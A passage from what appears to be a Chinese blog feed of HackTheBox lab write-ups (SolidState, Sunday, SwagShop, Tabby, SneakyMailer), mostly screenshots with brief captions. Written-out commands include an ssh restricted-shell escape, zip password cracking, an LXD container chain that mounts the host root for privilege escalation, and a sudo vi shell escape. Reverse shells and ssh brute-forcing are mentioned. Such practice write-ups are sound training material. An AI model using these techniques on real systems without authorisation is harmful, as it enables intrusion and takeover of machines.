                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.4m543x6ez6s0.webp"
                     
                ></p>
<p>第二封邮件发现一个账号密码，尝试ssh登录一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.74rmc3thp280.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.5kv44m2742c0.webp"
                     
                ></p>
<p>ssh被限制了，绕过一下</p>
<p><code>ssh username@IP &quot;export TERM=xterm;python -c &#39;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&#39;&quot;</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.4io9f9lew2y0.webp"
                     
                ></p>
<p>成功绕过</p>
<p>上传检测脚本，检测提权方法</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.rl47t161rc.webp"
                     
                ></p>
<p>在opt目录下有一个root用户的可读写脚本文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.37q84e4wd8i0.webp"
                     
                ></p>
<p>文件功能是用来清理tmp目录的，感觉是个定时文件，追加写入反弹shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.32x82rkcbq40.webp"
                     
                ></p>
<p>监听</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SolidState/image.nxh7spa658w.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Sunday - HackTheBox</title>
    <url>/post/c28b84c0aec7/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.1r01bcqx0glc.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.548qowlowyw.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.4rs8u0ccqc20.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.6tp8gof0ibw0.webp"
                     
                ></p>
<p>看看6787</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.5lmagsk2lf40.webp"
                     
                ></p>
<p>貌似是个oracle数据库的管理工具，搜一下看看有没有默认密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.45xpqixx7ui0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.4gasmcn6erg0.webp"
                     
                ></p>
<p>并不行</p>
<p>扫下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.20pok5jjzt6o.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.2053pssq737k.webp"
                     
                ></p>
<p>没有可利用信息，继续看nmap扫描结果</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.1ylv4ydk3tcw.webp"
                     
                ></p>
<p>79端口开了个finger服务，不认识，搜一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.3yvry0i3ais0.webp"
                     
                ></p>
<p>可以枚举用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.2pcn9697bmi0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.7lbpz3vhss40.webp"
                     
                ></p>
<p>有点慢，metasploit也有这个模块</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.3sh68x15rz00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.3rd00awo98m0.webp"
                     
                ></p>
<p>在利用获取到的用户名去爆破一下ssh端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.65ryxp5gzzs0.webp"
                     
                ></p>
<p>ssh连接，<code>ssh -p 22022 sunny@10.10.10.76</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.nupyqh84h5c.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.3ynzwvighx60.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.7kzbcbv61l00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.5iwwhgf2354.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.fe9qmkmvf74.webp"
                     
                ></p>
<p>没有可利用提权点</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.tcxgctaxs7k.webp"
                     
                ></p>
<p>发现一个backup文件夹</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.4fbg2lethng0.webp"
                     
                ></p>
<p>貌似是个shadow的备份</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.447s48u08h00.webp"
                     
                ></p>
<p>把&#x2F;etc&#x2F;passwd和备份文件shadow内的sammy都写到不同的两个文件，在合成一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.1dqhi0c1y0ww.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.3f20du8fnk80.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.6lo1o0ojh3c0.webp"
                     
                ></p>
<p>切换到sammy用户</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.66xwza4v2y00.webp"
                     
                ></p>
<p>利用wget提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.f16al0ah08w.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Sunday/image.5gbnx3c70tw0.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>SwagShop - HackTheBox</title>
    <url>/post/921c126290d9/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.4960161p6a60.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.1221m354d65s.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.ra3h90m7z0w.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.2zbxvou8k9o0.webp"
                     
                ></p>
<p>扫到了一个域名，添加到hosts文件</p>
<p>访问一下80端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.3f3on75rhjc0.webp"
                     
                ></p>
<p>有个登录口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.30n3skgmfra0.webp"
                     
                ></p>
<p>暂时不知道账号密码，注册一个上去看看</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.68r74a3anrg0.webp"
                     
                ></p>
<p>没找到什么可利用信息，扫一下目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.6wonqh89szk0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.1s0gutab021s.webp"
                     
                ></p>
<p>找到一个配置文件</p>
<p>还是没找到下一步的突破口</p>
<p>继续扫一下当前目录下有没有其他文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.66d8lbgglao0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.oyaxozjxv34.webp"
                     
                ></p>
<p>有个admin</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.5f0w6ngtias0.webp"
                     
                ></p>
<p>又是一个登录口，弱口令没测出来</p>
<p>搜一下这个Magento这个CMS，看看有没有历史漏洞</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.5m4pbqp9sq40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.4wn487poaqe0.webp"
                     
                ></p>
<p>找到一个python3的</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.2xyt2mhilaq0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.1n12eku5ho3k.webp"
                     
                ></p>
<p>可行</p>
<p>反弹个shell</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.138vk5jyr1i8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.5y3ky96c39w0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.60e6yhyspn40.webp"
                     
                ></p>
<p>当前用户可以以root身份通过vi去打开任何在&#x2F;var&#x2F;www&#x2F;html目录下的文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.5c542eb89qc0.webp"
                     
                ></p>
<p>利用sudo执行vi命令编辑api.php文件，在输入!&#x2F;bin&#x2F;bash</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.42uxy0aksq40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SwagShop/image.2a94hkc69ou8.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>Tabby - HackTheBox</title>
    <url>/post/5dffe8b93821/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.6fnmeo3202o0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.1xqjx6jt1q3k.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.d5q66gfz374.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.3nhyvwgnmfu0.webp"
                     
                ></p>
<p>貌似是个tomcat的站</p>
<p>先看看80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.4lwucqifhr00.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.65m5sqwe4bk0.webp"
                     
                ></p>
<p>发现一个域名，添加到hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.31z95jg90ys0.webp"
                     
                ></p>
<p>这里疑似一个文件包含</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.4noxyf849zi0.webp"
                     
                ></p>
<p>确实是文件包含，包含他本身看一下代码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.3ipuqrbjurs0.webp"
                     
                ></p>
<p>这就是打开文件，并不存在包含执行文件</p>
<p>在看看8080</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.7e594kcwhtc0.webp"
                     
                ></p>
<p>貌似就是个tomcat的后台</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.15lcwz54br34.webp"
                     
                ></p>
<p>弱口令不行，爆破的话感觉也不太行，试试用文件包含去找一下配置文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.2qqgvi65s0e0.webp"
                     
                ></p>
<p>这里给提示了</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.1t5bwoyvtktc.webp"
                     
                ></p>
<p>获得密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.4avxng5ouzy0.webp"
                     
                ></p>
<p>登录后也没发现上传war包的地方</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.109jtyon0ypc.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.2iyfqijctmk0.webp"
                     
                ></p>
<p>发现很多这种curl请求，搜一下有没有什么说法</p>
<p><code>https://medium.com/@cyb0rgs/exploiting-apache-tomcat-manager-script-role-974e4307cd00</code></p>
<p>貌似是有个类似于接口的功能，可以上传war包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.370tl6i6cje0.webp"
                     
                ></p>
<p>先生成一个war包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.ts6vszmwceo.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.2j99njk7o3u0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.561qgrm3fvc0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.5aofne8rsn40.webp"
                     
                ></p>
<p>提权</p>
<p>在网站目录下发现一个疑似备份文件的压缩包</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.78uto30gih40.webp"
                     
                ></p>
<p>把他下载到攻击机进行解压缩</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.6o9oetq24fk.webp"
                     
                ></p>
<p>还需要密码，爆破一下</p>
<p><code>zz2john bakckup.zip</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.6178n99clh00.webp"
                     
                ></p>
<p>将密钥写入一个文件，在利用john进行爆破</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.s2qzkkaxoi8.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.7gxe39uywf40.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.5hmxdkwigz00.webp"
                     
                ></p>
<p>解压后也没有可利用信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.3i6um5k708i0.webp"
                     
                ></p>
<p>passwd发现有ash用户，尝试用这个密码去切换</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.2s4oo9trpfm0.webp"
                     
                ></p>
<p>发现ash用户存在lxd组内，尝试用lxd提权</p>
<p>先在本地创建好所需文件</p>
<p><code>https://www.cnblogs.com/hirak0/p/16111530.html</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.5izo07id9h40.webp"
                     
                ></p>
<p>上传到靶机</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.5ducvev79j40.webp"
                     
                ></p>
<p>创建镜像</p>
<p><code>lxc image import lxd.tar.xz rootfs.squashfs --alias alpine</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.m2bq7ylq7cw.webp"
                     
                ></p>
<p><code>lxc init alpine privesc -c security.privileged=true</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.4nr0e7w69w60.webp"
                     
                ></p>
<p>如果报错的话，则重新运行<code>lxd init</code>创建新的存储池</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.cpodusldda0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.1zugvznisjts.webp"
                     
                ></p>
<p>一路回车即可</p>
<p>挂载root目录</p>
<p><code>lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.5915qkf7m2k0.webp"
                     
                ></p>
<p>启动镜像，并进入镜像shell会话</p>
<p><code>lxc start privesc</code> <code>lxc exec privesc /bin/sh</code></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Tabby/image.1bhxxk7v30n4.webp"
                     
                ></p>
]]></content>
      <tags>
        <tag>Hack-The-Box</tag>
      </tags>
  </entry>
  <entry>
    <title>SneakyMailer - HackTheBox</title>
    <url>/post/c69635a31a1b/</url>
    <content><![CDATA[<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.2u1evlk5sfc0.webp"
                     
                ></p>
<p>nmap扫描</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.6nyk4njieww0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.3yqgj3xlu380.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.2kebsn45tms0.webp"
                     
                ></p>
<p>访问80</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.1w0puidm88ww.webp"
                     
                ></p>
<p>添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.7j6pqwu0tas.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.68vj33ax8380.webp"
                     
                ></p>
<p>一大堆邮箱地址</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.7ebnj68idg40.webp"
                     
                ></p>
<p>25和143都开了邮件服务</p>
<p>尝试给这些邮箱地址发邮件，看看会不会有可用信息</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.37ig395iaic0.webp"
                     
                ></p>
<p>有一个地址给了回复，password经过url解码后疑似密码</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.74vurb3k67g0.webp"
                     
                ></p>
<p>尝试ssh登录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.6ksqg8uss6k0.webp"
                     
                ></p>
<p>在试试ftp</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.6f5i6jr5si80.webp"
                     
                ></p>
<p>发现一个dev目录</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.6x5sii73dac0.webp"
                     
                ></p>
<p>貌似就是网站的根目录，尝试上传一个反弹shell文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.3wtms69iaxa0.webp"
                     
                ></p>
<p>访问</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.1c7g0dsjm800.webp"
                     
                ></p>
<p>可能不在这个域名下，gobuster跑一下域名</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.4yhz2ynipa80.webp"
                     
                ></p>
<p>添加hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.3ilboq8l3im0.webp"
                     
                ></p>
<p>提权</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.4gohc1u1uug0.webp"
                     
                ></p>
<p>在网站目录下发现一个pypi的域名，也添加进hosts文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.54kyi5lux7o0.webp"
                     
                ></p>
<p>本地开放了一个5000端口</p>
<p>发现一个密钥文件</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.4utjgdybezy0.webp"
                     
                ></p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.6wy0hd7gkp00.webp"
                     
                ></p>
<p>在本地爆破一下</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.2iw67hzvn120.webp"
                     
                ></p>
<p>本地的5000端口通过nginx映射后为8080端口</p>
<p><img  
                     lazyload
                     alt="image"
                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/SneakyMailer/image.3hs9zyy3ujc0.webp"
                     
                ></p>
<p>访问一下</p>
<p><img  
                     lazyload
                     alt="image"
